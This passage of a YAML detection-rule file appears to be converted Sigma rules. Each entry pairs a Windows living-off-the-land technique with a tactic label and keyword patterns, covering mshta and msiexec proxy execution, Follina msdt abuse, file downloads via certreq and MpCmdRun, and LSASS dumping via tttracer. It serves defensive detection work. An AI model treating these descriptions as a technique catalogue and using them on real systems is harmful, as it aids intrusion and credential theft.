    summary:
      regex_any:
      - suspicious
      - diantz
      - download
      - compress
      - into
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aa8e035d_7be4_48d3_a944_102aec04400d
  intent: command_and_control_setup
  tactic: command_and_control
  description: Download or Copy file with Extrac32
  conditions:
    summary:
      regex_any:
      - suspicious
      - extrac32
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4b13db67_0c45_40f1_aba8_66a1a7198a1e
  intent: defense_evasion
  tactic: defense_evasion
  description: Extract data from cab file and hide it in an alternate data stream
  conditions:
    summary:
      regex_any:
      - suspicious
      - extrac32
      - alternate
      - data
      - stream
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_575dce0c_8139_4e30_9295_1ee75969f7fe
  intent: execution
  tactic: execution
  description: Detects execution of the built-in script located in "C:\Windows\System32\gatherNetworkInfo.vbs".
    Which can be used to gather information about the target machine
  conditions:
    summary:
      regex_any:
      - potential
      - reconnaissance
      - activity
      - gathernetworkinfo
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1e59c230_6670_45bf_83b0_98903780607e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of the LOLBIN gpscript, which executes logon
    or startup scripts configured in Group Policy
  conditions:
    summary:
      regex_any:
      - gpscript
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d3bf399f_b0cf_4250_8bb4_dfc192ab81dc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect use of ie4uinit.exe to execute commands from a specially prepared
    ie4uinit.inf file from a directory other than the usual directories
  conditions:
    summary:
      regex_any:
      - ie4uinit
      - lolbin
      - from
      - invalid
      - path
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_45d3a03d_f441_458c_8883_df101a3bb146
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script
    to execute commands.
  conditions:
    summary:
      regex_any:
      - launch
      - vsdevshell
      - proxy
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c363385c_f75d_4753_a108_c1a8e28bdbda
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential abuse of the "manage-bde.wsf" script as a LOLBIN
    to proxy execution
  conditions:
    summary:
      regex_any:
      - potential
      - manage
      - abuse
      - proxy
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4f73421b_5a0b_4bbf_a892_5a7fb99bea66
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects process injection using the signed Windows tool "Mavinject"
    via the "INJECTRUNNING" flag
  conditions:
    summary:
      regex_any:
      - mavinject
      - inject
      - into
      - running
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_729ce0ea_5d8f_4769_9762_e35de441586d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a certain command line flag combination used by mpiexec.exe
    LOLBIN from HPC pack that can be used to execute any other binary
  conditions:
    summary:
      regex_any:
      - mpiexec
      - lolbin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_646bc99f_6682_4b47_a73a_17b1b64c9d34
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects file execution using the msdeploy.exe lolbin
  conditions:
    summary:
      regex_any:
      - execute
      - files
      - with
      - msdeploy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9c8c7000_3065_44a8_a555_79bcba5d9955
  intent: execution
  tactic: execution
  description: Detects execution of "msdt.exe" using an answer file which is simulating
    the legitimate way of calling msdt via "pcwrun.exe" (For example from the compatibility
    tab)
  conditions:
    summary:
      regex_any:
      - execute
      - msdt
      - answer
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_814c95cc_8192_4378_a70a_f1aafd877af1
  intent: execution
  tactic: execution
  description: Detects usage of OpenConsole binary as a LOLBIN to launch other binaries
    to bypass application Whitelisting
  conditions:
    summary:
      regex_any:
      - openconsole
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cec8e918_30f7_4e2d_9bfa_a59cc97ae60f
  intent: defense_evasion
  tactic: defense_evasion
  description: The OpenWith.exe executes other binary
  conditions:
    summary:
      regex_any:
      - openwith
      - executes
      - specified
      - binary
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0955e4e1_c281_4fb9_9ee1_5ee7b4b754d2
  intent: execution
  tactic: execution
  description: Detects execition of commands and binaries from the context of The
    program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in
    order to bypass application whitelisting.
  conditions:
    summary:
      regex_any:
      - pcalua
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6004abd0_afa4_4557_ba90_49d172e0a299
  intent: execution
  tactic: execution
  description: Detects indirect command execution via Program Compatibility Assistant
    "pcwrun.exe" leveraging the follina (CVE-2022-30190) vulnerability
  conditions:
    summary:
      regex_any:
      - execute
      - pcwrun
      - leverage
      - follina
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9386d78a_7207_4048_9c9f_a93a7c2d1c05
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects launch of executable by calling the LaunchApplication function
    from pcwutl.dll library.
  conditions:
    summary:
      regex_any:
      - code
      - execution
      - pcwutl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_18988e1b_9087_4f8a_82fe_0414dce49878
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects code execution via Pester.bat (Pester - Powershell Modulte
    for testing)
  conditions:
    summary:
      regex_any:
      - execute
      - code
      - with
      - pester
      - parent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_59e938ff_0d6d_4dc3_b13f_36cc28734d4e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects code execution via Pester.bat (Pester - Powershell Modulte
    for testing)
  conditions:
    summary:
      regex_any:
      - execute
      - code
      - with
      - pester
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cafeeba3_01da_4ab4_b6c4_a31b1d9730c7
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of the LOLBIN PrintBrm.exe, which can be used
    to create or extract ZIP files. PrintBrm.exe should not be run on a normal workstation.
  conditions:
    summary:
      regex_any:
      - printbrm
      - creation
      - extraction
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1fb76ab8_fa60_4b01_bddd_71e89bf555da
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of the 'Pubprn.vbs' Microsoft signed script to execute
    commands.
  conditions:
    summary:
      regex_any:
      - pubprn
      - proxy
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd3d1298_eb3b_476c_ac67_12847de55813
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects using Rasautou.exe for loading arbitrary .DLL specified in
    -d option and executes the export specified in -p.
  conditions:
    summary:
      regex_any:
      - execution
      - rasautou
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1c8774a0_44d4_4db0_91f8_e792359c70bd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to
    register a VSS/VDS Provider as a COM+ application.
  conditions:
    summary:
      regex_any:
      - register_app
      - proxy
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4eddc365_79b4_43ff_a9d7_99422dc34b93
  intent: defense_evasion
  tactic: defense_evasion
  description: Remote.exe is part of WinDbg in the Windows SDK and can be used for
    AWL bypass and running remote files.
  conditions:
    summary:
      regex_any:
      - remote
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9292293b_8496_4715_9db6_37028dcda4b3
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the use of Replace.exe which can be used to replace file with
    another file
  conditions:
    summary:
      regex_any:
      - replace
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd71385d_fd9b_4691_9b98_2b1f7e508714
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect usage of the "runexehelper.exe" binary as a proxy to launch
    other programs
  conditions:
    summary:
      regex_any:
      - lolbin
      - runexehelper
      - proxy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eca49c87_8a75_4f13_9c73_a5a29e845f03
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of powershell scripts via Runscripthelper.exe
  conditions:
    summary:
      regex_any:
      - suspicious
      - runscripthelper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_64760eef_87f7_4ed3_93fd_655668ea9420
  intent: execution
  tactic: execution
  description: The "ScriptRunner.exe" binary can be abused to proxy execution through
    it and bypass possible whitelisting
  conditions:
    summary:
      regex_any:
      - scriptrunner
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b2ddd389_f676_4ac4_845a_e00781a48e5f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects using SettingSyncHost.exe to run hijacked binary
  conditions:
    summary:
      regex_any:
      - using
      - settingsynchost
      - lolbin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a85ffc3a_e8fd_4040_93bf_78aff284d801
  intent: execution
  tactic: execution
  description: Detects the usage of the "sftp.exe" binary as a LOLBIN by abusing the
    "-D" flag
  conditions:
    summary:
      regex_any:
      - sftp
      - binary
      - lolbin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4480827a_9799_4232_b2c4_ccc6c4e9e12b
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a suspicious certreq execution taken from the LOLBAS examples,
    which can be abused to download (small) files
  conditions:
    summary:
      regex_any:
      - suspicious
      - certreq
      - command
      - download
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a2ea3ae7_d3d0_40a0_a55c_25a45c87cac1
  intent: persistence_installation
  tactic: persistence
  description: Detects when a possible suspicious driver is being installed via pnputil.exe
    lolbin
  conditions:
    summary:
      regex_any:
      - suspicious
      - driver
      - install
      - pnputil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f14e169e_9978_4c69_acb3_1cff8200bc36
  intent: persistence_installation
  tactic: persistence
  description: Detects the suspicious execution of a utility to convert Windows 3.x
    .grp files or for persistence purposes by malicious software or actors
  conditions:
    summary:
      regex_any:
      - suspicious
      - grpconv
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_23ceaf5c_b6f1_4a32_8559_f2ff734be516
  intent: credential_harvesting
  tactic: credential_access
  description: Detects process dump via legitimate sqldumper.exe binary
  conditions:
    summary:
      regex_any:
      - dumping
      - process
      - sqldumper
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fbd7c32d_db2a_4418_b92c_566eb8911133
  intent: defense_evasion
  tactic: defense_evasion
  description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.
  conditions:
    summary:
      regex_any:
      - syncappvpublishingserver
      - execute
      - arbitrary
      - powershell
      - code
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36475a7d_0f6d_4dce_9b01_6aeb473bbaf1
  intent: defense_evasion
  tactic: defense_evasion
  description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs
  conditions:
    summary:
      regex_any:
      - syncappvpublishingserver
      - execute
      - arbitrary
      - powershell
      - code
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_148431ce_4b70_403d_8525_fcc2993f29ea
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential DLL injection and execution using "Tracker.exe"
  conditions:
    summary:
      regex_any:
      - potential
      - injection
      - execution
      - using
      - tracker
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b27077d6_23e6_45d2_81a0_e2b356eea5fd
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the executiob of TTDInject.exe, which is used by Windows 10
    v1809 and newer to debug time travel (underlying call of tttracer.exe)
  conditions:
    summary:
      regex_any:
      - ttdinject
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0b4ae027_2a2d_4b93_8c7e_962caaba5b2a
  intent: credential_harvesting
  tactic: credential_access
  description: Detects usage of Time Travel Debugging Utility. Adversaries can execute
    malicious processes and dump processes, such as lsass.exe, via tttracer.exe.
  conditions:
    summary:
      regex_any:
      - time
      - travel
      - debugging
      - utility
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_727454c0_d851_48b0_8b89_385611ab0704
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect usage of the "unregmp2.exe" binary as a proxy to launch a custom
    version of "wmpnscfg.exe"
  conditions:
    summary:
      regex_any:
      - lolbin
      - unregmp2
      - proxy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0403d67d_6227_4ea8_8145_4e72db7da120
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the use of a Microsoft signed script executing a managed DLL
    with PowerShell.
  conditions:
    summary:
      regex_any:
      - utilityfunctions
      - proxy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b30a8bc5_e21b_4ca2_9420_0a94019ac56a
  intent: defense_evasion
  tactic: defense_evasion
  description: VisualUiaVerifyNative.exe is a Windows SDK that can be used for AWL
    bypass and is listed in Microsoft's recommended block rules.
  conditions:
    summary:
      regex_any:
      - visualuiaverifynative
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7b10f171_7f04_47c7_9fa2_5be43c76e535
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects successful code compilation via Visual Basic Command Line Compiler
    that utilizes Windows Resource to Object Converter.
  conditions:
    summary:
      regex_any:
      - visual
      - basic
      - command
      - line
      - compiler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_18749301_f1c5_4efc_a4c3_276ff1f5b6f8
  intent: defense_evasion
  tactic: defense_evasion
  description: The "VSIISExeLauncher.exe" binary part of the Visual Studio/VS Code
    can be used to execute arbitrary binaries
  conditions:
    summary:
      regex_any:
      - vsiisexelauncher
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_49be8799_7b4d_4fda_ad23_cafbefdebbc5
  intent: defense_evasion
  tactic: defense_evasion
  description: The Workflow Command-line Compiler can be used for AWL bypass and is
    listed in Microsoft's recommended block rules.
  conditions:
    summary:
      regex_any:
      - use\ of\ wfc\.exe
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_28c8f68b_098d_45af_8d43_8089f3e35403
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential abuse of the "register_app.vbs" script that is part
    of the Windows SDK. The script offers the capability to register new VSS/VDS Provider
    as a COM+ application. Attackers can use this to install malicious DLLs for persistence
    and execution.
  conditions:
    summary:
      regex_any:
      - potential
      - register_app
      - lolscript
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c8da0dfd_4ed0_4b68_962d_13c9c884384e
  intent: credential_harvesting
  tactic: credential_access
  description: Detects a suspicious LSASS process process clone that could be a sign
    of credential dumping activity
  conditions:
    summary:
      regex_any:
      - potential
      - credential
      - dumping
      - lsass
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3d48c9d3_1aa6_418d_98d3_8fd3c01a564e
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects child processes of the "Trace log generation tool for Media
    Foundation Tools" (Mftrace.exe) which can abused to execute arbitrary binaries.
  conditions:
    summary:
      regex_any:
      - potential
      - mftrace
      - abuse
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f1f3bf22_deb2_418d_8cce_e1a45e46a5bd
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects MMC20.Application Lateral Movement; specifically looks for
    the spawning of the parent MMC.exe with a command line of "-Embedding" as a child
    of svchost.exe
  conditions:
    summary:
      regex_any:
      - mmc20
      - lateral
      - movement
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9cfe4b27_1e56_48b4_b7a8_d46851c91a44
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects malicious behavior where the MMC utility (`mmc.exe`) executes
    files with reversed extensions caused by Right-to-Left Override (RLO) abuse, disguising
    them as document formats.
  conditions:
    summary:
      regex_any:
      - executing
      - files
      - with
      - reversed
      - extensions
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_05a2ab7e_ce11_4b63_86db_ab32e763e11d
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects a Windows command line executable started from MMC
  conditions:
    summary:
      regex_any:
      - spawning
      - windows
      - shell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_12fbff88_16b5_4b42_9754_cd001a789fb3
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a CodePage modification using the "mode.com" utility to Russian
    language.

    This behavior has been used by threat actors behind Dharma ransomware.

    '
  conditions:
    summary:
      regex_any:
      - codepage
      - modification
      - mode
      - russian
      - language
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1dd05363_104e_4b4a_b963_196a534b03a1
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of the "mofcomp" utility as a child of a suspicious
    shell or script running utility or by having a suspicious path in the commandline.

    The "mofcomp" utility parses a file containing MOF statements and adds the classes
    and class instances defined in the file to the WMI repository.

    Attackers abuse this utility to install malicious MOF scripts

    '
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - mofcomp
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7002aa10_b8d4_47ae_b5ba_51ab07e228b9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential sideloading of "mpclient.dll" by Windows Defender
    processes ("MpCmdRun" and "NisSrv") from their non-default directory.
  conditions:
    summary:
      regex_any:
      - potential
      - mpclient
      - sideloading
      - defender
      - binaries
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_46123129_1024_423e_9fae_43af4a0fa9a5
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the use of Windows Defender MpCmdRun.EXE to download files
  conditions:
    summary:
      regex_any:
      - file
      - download
      - windows
      - defender
      - mpcmprun
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9719a8aa_401c_41af_8108_ced7ec9cd75c
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may disable security tools to avoid possible detection
    of their tools and activities by removing Windows Defender Definition Files
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - definition
      - files
      - removed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_33be4333_2c6b_44f4_ae28_102cdbde0a31
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious execution of 'Msbuild.exe' by a uncommon parent
    process
  conditions:
    summary:
      regex_any:
      - suspicious
      - msbuild
      - execution
      - uncommon
      - parent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_258fc8ce_8352_443a_9120_8a11e4857fa5
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects processes leveraging the "ms-msdt" handler or the "msdt.exe"
    binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability
  conditions:
    summary:
      regex_any:
      - potential
      - arbitrary
      - command
      - execution
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dc4576d4_7467_424f_9eee_fd2b02855fe0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of msdt.exe using the "cab" flag which could indicates
    suspicious diagcab files with embedded answer files leveraging CVE-2022-30190
  conditions:
    summary:
      regex_any:
      - suspicious
      - cabinet
      - file
      - execution
      - msdt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7a74da6b_ea76_47db_92cc_874ad90df734
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190
    / Follina exploitation
  conditions:
    summary:
      regex_any:
      - suspicious
      - msdt
      - parent
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e84d89c4_f544_41ca_a6af_4b92fd38b023
  intent: execution
  tactic: execution
  description: Detects usage of "msedge_proxy.exe" to download arbitrary files
  conditions:
    summary:
      regex_any:
      - arbitrary
      - file
      - download
      - msedge_proxy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b98d0db6_511d_45de_ad02_e82a98729620
  intent: execution
  tactic: execution
  description: Detects execution of the "mshta" utility with an argument containing
    the "http" keyword, which could indicate that an attacker is executing a remotely
    hosted malicious hta file
  conditions:
    summary:
      regex_any:
      - remotely
      - hosted
      - file
      - executed
      - mshta
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2c28c248_7f50_417a_9186_a85b223010ee
  intent: execution
  tactic: execution
  description: Detects the presence of the keywords "Wscript", "Shell" and "Run" in
    the command, which could indicate a suspicious activity
  conditions:
    summary:
      regex_any:
      - wscript
      - shell
      - commandline
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_67f113fa_e23d_4271_befa_30113b3e08b1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of javascript code using "mshta.exe".
  conditions:
    summary:
      regex_any:
      - suspicious
      - javascript
      - execution
      - mshta
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ed5d72a6_f8f4_479d_ba79_02f6a80d7471
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential LethalHTA technique where the "mshta.exe" is spawned
    by an "svchost.exe" process
  conditions:
    summary:
      regex_any:
      - potential
      - lethalhta
      - technique
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_03cc0c25_389f_4bf8_b48d_11878079f1ca
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a suspicious process spawning from an "mshta.exe" process,
    which could be indicative of a malicious HTA script execution
  conditions:
    summary:
      regex_any:
      - suspicious
      - mshta
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cc7abbd0_762b_41e3_8a26_57ad50d2eea3
  intent: execution
  tactic: execution
  description: 'Detects execution of mshta.exe with file types that looks like they
    do not typically represent HTA (HTML Application) content,

    such as .png, .jpg, .zip, .pdf, and others, which are often polyglots. MSHTA is
    a legitimate Windows utility for executing HTML Applications

    containing VBScript or JScript. Threat actors often abuse this lolbin utility
    to download and

    execute malicious scripts disguised as benign files or hosted under misleading
    extensions to evade detection.

    '
  conditions:
    summary:
      regex_any:
      - mshta
      - execution
      - with
      - suspicious
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e32f92d1_523e_49c3_9374_bdb13b46a3ba
  intent: execution
  tactic: execution
  description: Detects suspicious mshta process execution patterns
  conditions:
    summary:
      regex_any:
      - suspicious
      - mshta
      - execution
      - patterns
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_84f52741_8834_4a8c_a413_2eb2269aa6c8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects MsiExec loading a DLL and calling its DllUnregisterServer function
  conditions:
    summary:
      regex_any:
      - dllunregisterserver
      - function
      - call
      - msiexec
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4a2a2c3e_209f_4d01_b513_4155a540b469
  intent: defense_evasion
  tactic: defense_evasion
  description: Adversaries may abuse msiexec.exe to proxy the execution of malicious
    payloads
  conditions:
    summary:
      regex_any:
      - suspicious
      - msiexec
      - embedding
      - parent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6f4191bb_912b_48a8_9ce7_682769541e6d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Adversaries may abuse msiexec.exe to proxy execution of malicious
    payloads.

    Msiexec.exe is the command-line utility for the Windows Installer and is thus
    commonly associated with executing installation packages (.msi)

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - msiexec
      - execute
      - arbitrary
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_79a87aa6_e4bd_42fc_a5bb_5e6fbdcd62f5
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Adversaries may abuse msiexec.exe to proxy execution of malicious
    payloads.

    Msiexec.exe is the command-line utility for the Windows Installer and is thus
    commonly associated with executing installation packages (.msi)

    '
  conditions:
    summary:
      regex_any:
      - msiexec
      - quiet
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8150732a_0c9d_4a99_82b9_9efb9b90c40c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of Msiexec.exe to install packages hosted remotely quietly
  conditions:
    summary:
      regex_any:
      - suspicious
      - msiexec
      - quiet
      - install
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e22a6eb2_f8a5_44b5_8b44_a2dbd47b1144
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of msiexec.exe from an uncommon directory
  conditions:
    summary:
      regex_any:
      - potential
      - msiexec
      - masquerading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f7b5f842_a6af_4da5_9e95_e32478f3cd2f
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects suspicious msiexec process starts with web addresses as parameter
  conditions:
    summary:
      regex_any:
      - msiexec
      - install
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_459f2f98_397b_4a4a_9f47_6a5ec2f1c69d
  intent: execution
  tactic: execution
  description: Detects usage of "MSOHTMED" to download arbitrary files
  conditions:
    summary:
      regex_any:
      - arbitrary
      - file
      - download
      - msohtmed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3b3c7f55_f771_4dd6_8a6e_08d057a17caf
  intent: execution
  tactic: execution
  description: Detects usage of "MSPUB" (Microsoft Publisher) to download arbitrary
    files
  conditions:
    summary:
      regex_any:
      - arbitrary
      - file
      - download
      - mspub
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_744a188b_0415_4792_896f_11ddb0588dbc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential process injection via Microsoft Remote Asssistance
    (Msra.exe) by looking at suspicious child processes spawned from the aforementioned
    process. It has been a target used by many threat actors and used for discovery
    and persistence tactics
  conditions:
    summary:
      regex_any:
      - potential
      - process
      - injection
      - msra
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0152550d_3a26_4efd_9f0e_54a0b28ae2f3
  intent: defense_evasion
  tactic: defense_evasion
  description: 'This rule detects execution of a PowerShell code through the sqlps.exe
    utility, which is included in the standard set of utilities supplied with the
    MSSQL Server.

    Script blocks are not logged in this case, so this utility helps to bypass protection
    mechanisms based on the analysis of these logs.

    '
  conditions:
    summary:
      regex_any:
      - detection
      - powershell
      - execution
      - sqlps
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a746c9b8_a2fb_4ee5_a428_92bee9e99060
  intent: defense_evasion
  tactic: defense_evasion
  description: 'This rule detects execution of a PowerShell code through the sqltoolsps.exe
    utility, which is included in the standard set of utilities supplied with the
    Microsoft SQL Server Management studio.

    Script blocks are not logged in this case, so this utility helps to bypass protection
    mechanisms based on the analysis of these logs.

    '
  conditions:
    summary:
      regex_any:
      - client
      - tools
      - powershell
      - session
      - detection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_869b9ca7_9ea2_4a5a_8325_e80e62f75445
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious child processes of the SQLServer process. This could
    indicate potential RCE or SQL Injection.
  conditions:
    summary:
      regex_any:
      - suspicious
      - child
      - process
      - server
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d55b793d_f847_4eea_b59a_5ab09908ac90
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects suspicious child processes of the Veeam service process. This
    could indicate potential RCE or SQL Injection.
  conditions:
    summary:
      regex_any:
